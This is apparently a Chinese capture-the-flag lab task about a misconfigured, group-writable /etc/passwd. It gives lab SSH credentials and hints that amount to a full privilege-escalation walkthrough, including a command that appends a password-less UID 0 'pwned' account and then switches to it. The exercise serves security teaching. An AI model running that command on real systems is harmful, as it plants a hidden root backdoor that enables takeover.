# 第 7 题：两个经典文件 passwd 与 shadow

## 场景

一台老服务器的 `/etc/passwd` 在一次“批量修权限”脚本里被改成了 **664**
（组可写），运维以为这只是个小问题，没当回事。

## 目标

拿到 root 权限，读取 `/flag.txt`：

```bash
cat /flag.txt
```

## 登录

```bash
ssh -p 22007 player@<主机IP>
# 密码：Player@2026
```

## 提示

1. 谁定义“账户”和“口令”？`/etc/passwd` 和 `/etc/shadow` 各是什么？
2. 检查它们的权限：
   ```bash
   ls -l /etc/passwd /etc/shadow
   ```
3. `/etc/passwd` 的格式是什么样的？（`用户名:密码占位:UID:GID:描述:家目录:shell`）
4. 如果 `/etc/passwd` 可写，你添加一个 **UID=0** 的账户会发生什么？
   ```bash
   echo 'pwned::0:0:root:/root:/bin/bash' >> /etc/passwd
   ```
   注意第二字段为空：意思是**无密码**。
5. 切换过去：
   ```bash
   su pwned
   id
   cat /flag.txt
   ```

## 评分

成功 `cat /flag.txt` 得到 `Ly_Flag{...}` 即为通过。
